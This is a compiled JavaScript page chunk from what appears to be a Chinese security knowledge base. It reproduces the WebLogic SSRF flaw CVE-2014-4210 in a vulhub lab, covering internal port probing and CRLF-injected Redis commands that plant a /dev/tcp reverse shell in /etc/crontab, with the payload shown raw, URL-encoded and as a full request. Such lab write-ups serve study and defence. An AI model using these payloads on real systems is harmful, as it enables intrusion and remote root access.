{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[36],{1645:function(t,s,a){t.exports=a.p+\"assets/img/1627122010908-dfbdc992-8a59-4638-b56d-404f0b538c7e.ffbcd98d.png\"},1646:function(t,s,a){t.exports=a.p+\"assets/img/1627122062901-5664349d-68fe-4128-a6d6-ec843fefd82d.85fd2c50.png\"},1647:function(t,s,a){t.exports=a.p+\"assets/img/1627122076972-b0156bf5-41a6-4b62-9cc3-2d526f092083.84ec3ab2.png\"},1648:function(t,s,a){t.exports=a.p+\"assets/img/1627122081877-63d635ee-e032-4d56-a627-27606bdf334f.9cc9a235.png\"},1649:function(t,s,a){t.exports=a.p+\"assets/img/1627122086475-d48ce9eb-a76c-4daa-94b1-fce15687b76e.86d48b62.png\"},1650:function(t,s,a){t.exports=a.p+\"assets/img/1627122093990-acdd4a50-b1ff-493f-8c86-dcd2e1445641.e326b73f.png\"},2111:function(t,s,a){\"use strict\";a.r(s);var e=a(56),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[e(\"h1\",{attrs:{id:\"weblogic-ssrf漏洞-cve-2014-4210\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#weblogic-ssrf漏洞-cve-2014-4210\"}},[t._v(\"#\")]),t._v(\" Weblogic SSRF漏洞 CVE-2014-4210\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞描述\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[t._v(\"#\")]),t._v(\" 漏洞描述\")]),t._v(\" \"),e(\"p\",[t._v(\"Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性\")]),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞影响\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[t._v(\"#\")]),t._v(\" 漏洞影响\")]),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"Oracle WebLogic Server 10.0.2.0\")]),e(\"br\"),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"Oracle WebLogic Server 10.3.6.0\")]),e(\"br\"),t._v(\" \"),e(\"h2\",{attrs:{id:\"环境搭建\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#环境搭建\"}},[t._v(\"#\")]),t._v(\" 环境搭建\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-plain extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[e(\"code\",[t._v(\"git clone https://github.com/vulhub/vulhub.git\\ncd vulhub/weblogic/ssrd\\ndocker-compose up -d\\n\")])])]),e(\"p\",[t._v(\"访问 \"),e(\"code\",[t._v(\"http://xxx.xxx.xxx.xxx:7001\")]),t._v(\" 正常即可\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(1645),alt:\"img\"}})]),t._v(\" \"),e(\"h2\",{attrs:{id:\"漏洞复现\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[t._v(\"#\")]),t._v(\" 漏洞复现\")]),t._v(\" \"),e(\"p\",[t._v(\"出现漏洞的 URL为 : \"),e(\"code\",[t._v(\"http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp\")])]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(1646),alt:\"img\"}})]),t._v(\" \"),e(\"p\",[t._v(\"使用 payload 进行探测, 将探测的位置写在 operator参数中\")]),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"注意需要知道内网 IP\")]),e(\"br\"),t._v(\" \"),e(\"div\",{staticClass:\"language-plain extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-plain\"}},[e(\"code\",[t._v(\"/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://xxx.xxx.xxx.xxx:7001\\n\")])])]),e(\"p\",[t._v(\"通过查看报错内容来进行判断\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(1647),alt:\"img\"}})]),t._v(\" \"),e(\"p\",[t._v(\"存在的报错内容如图，关键字为 \"),e(\"code\",[t._v(\"404\")]),t._v(\" ,例如把 \"),e(\"code\",[t._v(\"operator\")]),t._v(\" 参数改成 \"),e(\"code\",[t._v(\"http://xxx.xxx.xxx.xxx:7000\")]),t._v(\" 这样不存在的则报错内容如下图\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(1648),alt:\"img\"}})]),t._v(\" \"),e(\"p\",[t._v(\"通过这样的方法就可以探测内网的开放端口情况，例如内网中有一台主机 \"),e(\"code\",[t._v(\"IP：172.19.0.2\")]),t._v(\" 开启\"),e(\"code\",[t._v(\"6379端口的redis服务\")])]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(1649),alt:\"img\"}})]),t._v(\" \"),e(\"p\",[t._v(\"如果访问的非http协议，则会返回\"),e(\"code\",[t._v(\"did not have a valid SOAP content-type\")]),t._v(\"，这样通过错误的不同，即可探测内网状态。\")]),t._v(\" \"),e(\"p\",[t._v(\"Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入\"),e(\"code\",[t._v(\"%0a%0d\")]),t._v(\"来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。\")]),t._v(\" \"),e(\"p\",[t._v(\"发送三条redis命令，将弹shell脚本写入\"),e(\"code\",[t._v(\"/etc/crontab\")]),t._v(\" 中：\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-shell extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[e(\"code\",[e(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"set\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token string\"}},[t._v('\"'),e(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[t._v(\"\\\\n\")]),e(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[t._v(\"\\\\n\")]),e(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[t._v(\"\\\\n\")]),e(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[t._v(\"\\\\n\")]),t._v(\"* * * * * root bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\"),e(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[t._v(\"\\\\n\")]),e(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[t._v(\"\\\\n\")]),e(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[t._v(\"\\\\n\")]),e(\"span\",{pre:!0,attrs:{class:\"token entity\",title:\"\\\\n\"}},[t._v(\"\\\\n\")]),t._v('\"')]),t._v(\"\\nconfig \"),e(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"set\")]),t._v(\" \"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"dir\")]),t._v(\" /etc/\\nconfig \"),e(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[t._v(\"set\")]),t._v(\" dbfilename \"),e(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"crontab\")]),t._v(\"\\nsave\\n\")])])]),e(\"p\",[t._v(\"接着再将请求进行 \"),e(\"code\",[t._v(\"url编码\")])]),t._v(\" \"),e(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"注意，换行符是“\\\\r\\\\n”，也就是“%0D%0A”\")]),e(\"br\"),t._v(\" \"),e(\"div\",{staticClass:\"language-shell extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[e(\"code\",[t._v(\"test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa\\n\")])])]),e(\"p\",[t._v(\"发送payload\")]),t._v(\" \"),e(\"div\",{staticClass:\"language-shell extra-class\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[e(\"code\",[t._v(\"/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"name\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"&\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[t._v(\"txtSearchname\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"sdf\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"&\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[t._v(\"txtSearchkey\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"&\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[t._v(\"txtSearchfor\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"&\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[t._v(\"selfor\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"Business+location\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"&\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[t._v(\"btnSubmit\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"Search\"),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"&\")]),e(\"span\",{pre:!0,attrs:{class:\"token assign-left variable\"}},[t._v(\"operator\")]),e(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),t._v(\"http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa\\n\")])])]),e(\"p\",[t._v(\"发送后监听 \"),e(\"code\",[t._v(\"172.19.0.3 9999端口\")]),t._v(\"等待反弹shell\")]),t._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(1650),alt:\"img\"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);","extractedComments":[]}